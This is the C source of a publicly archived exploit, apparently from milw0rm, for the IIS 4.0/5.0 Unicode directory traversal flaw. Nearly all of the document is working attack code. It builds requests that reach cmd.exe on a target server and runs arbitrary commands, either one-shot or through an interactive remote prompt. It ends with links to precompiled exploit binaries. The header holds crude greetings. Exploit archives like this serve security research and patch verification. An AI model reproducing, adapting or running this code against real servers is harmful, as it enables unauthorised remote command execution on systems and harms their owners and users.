/****************************************************************************\
**                                                                          **
**    Microsoft IIS 4.0/5.0 Extended UNICODE Directory Traversal Exploit    **
**      proof of theory exploit cuz it's wednesday and i'm on the couch     **
**                                                                          **
**       brought to you by the letter B, the number 7, optyx, and t12       **
**          optyx - <optyx@uberhax0r.net optyx@newhackcity.net>             **
**          t12 - <t12@uberhax0r.net>                                       **
**                                                                          **
**     greetz go out to aempirei, a gun toatin' gangstah' hustler' player   **
**     motherfucker who isn't with us anymore, miah, who's GTA2 game was    **
**     was most entertaining tonight, Cathy, who provided the trippy light  **
**     to stare at, and to KT, for providing me with hours of decent        **
**     conversation.                                                        **
**                                                                          **
\****************************************************************************/

#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

void usage(void) 
{
 fprintf(stderr, "usage: ./iis-zank <-t target> <-c 'command' or -i>"); 
 fprintf(stderr, " [-p port] [-t timeout]\n"); 
 exit(-1);
}

int main(int argc, char **argv) 
{
 int i, j;
 int port=80;
 int timeout=3;
 int interactive=0;
 char temp[1];
 char host[512]=""; 
 char cmd[1024]="";
 char request[8192]="GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+";
 struct hostent *he;
 struct sockaddr_in s_addr;

 printf("iis-zank_bread_chafer_8000_super_alpha_hyper_pickle.c\n");
 printf("by optyx and t12\n");

 for(i=0;i<argc;i++) 
	{ if(argv[i][0] == '-') {
		 for(j=1;j<strlen(argv[i]);j++) 
		 	{
			 switch(argv[i][j]) 
			 	{
				 case 't':
				 	strncpy(host, argv[i+1], sizeof(host));
				 	break;
				 case 'c':
				 	strncpy(cmd, argv[i+1], sizeof(cmd));
				 	break;
				 case 'h':
				 	usage();
			 	 	break;
				 case 'o':
					timeout=atoi(argv[i+1]); 
				 	break;
				 case 'p':
				 	port=atoi(argv[i+1]);
				 	break;
				 case 'i':
				 	interactive=1;
				 	break;
				 default:
				 break;
				}
			}
		}
	}

 if(!strcmp(host, "")) 
	{
	 fprintf(stderr, "specify target host\n");
	 usage();
	}

 if(!strcmp(cmd, "") && !interactive) 
	{
	 fprintf(stderr, "specify command to execute\n");
	 usage();
	}

 printf("]- Target - %s:%d\n", host, port);
 if(!interactive)
 	 printf("]- Command - %s\n", cmd);
 printf("]- Timeout - %d seconds\n", timeout);
 if((he=gethostbyname(host)) == NULL) 
	{
 	 fprintf(stderr, "invalid target\n");
	 usage();
	}

 do
 	{

	 if(interactive)
	 	 {
		  cmd[0]=0;
		  printf("\nC> ");
		  if(fgets(cmd, sizeof(cmd), stdin) == NULL)
		  	  fprintf(stderr, "gets() error\n"); 
		  cmd[strlen(cmd)-1]='\0';
		  if(!strcmp("exit", cmd))
		  	  exit(-1);
		 }

 	 for(i=0;i<strlen(cmd);i++) 
		 {
	 	  if(cmd[i]==' ')
		  	cmd[i]='+';
		 }

	 strncpy(request, 
		   "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+",
		   sizeof(request));
 	 strncat(request, cmd, sizeof(request) - strlen(request));	
 	 strncat(request, "\n", sizeof(request) - strlen(request));

 	 s_addr.sin_family = PF_INET;
 	 s_addr.sin_port = htons(port);
 	 memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr, 
 		sizeof(s_addr.sin_addr));	

 	 if((i=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) 
		 {
	 	  fprintf(stderr, "cannot create socket\n");
	 	  exit(-1);
		 }

 	 alarm(timeout);
 	 j = connect(i, (struct sockaddr *) &s_addr, sizeof(s_addr));
 	 alarm(0);

 	 if(j==-1) 
		 {
	 	  fprintf(stderr, "cannot connect to %s\n", host);
	 	  exit(-1);
	 	  close(i);
		 }

	 if(!interactive)
 	 	  printf("]- Sending request: %s\n", request);

 	 send(i, request, strlen(request), 0);

	 if(!interactive)
 	 	  printf("]- Getting results\n");

 	 while(recv(i,temp,1, 0)>0) 
		 {
         	  alarm(timeout);
	 	  printf("%c", temp[0]);
         	  alarm(0);
		 }	

  }
  while(interactive);

  close(i);	
  return 0;
}

https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/190-1.exe

https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/190-2.obsd

https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/190-3.linux

// milw0rm.com [2000-11-18]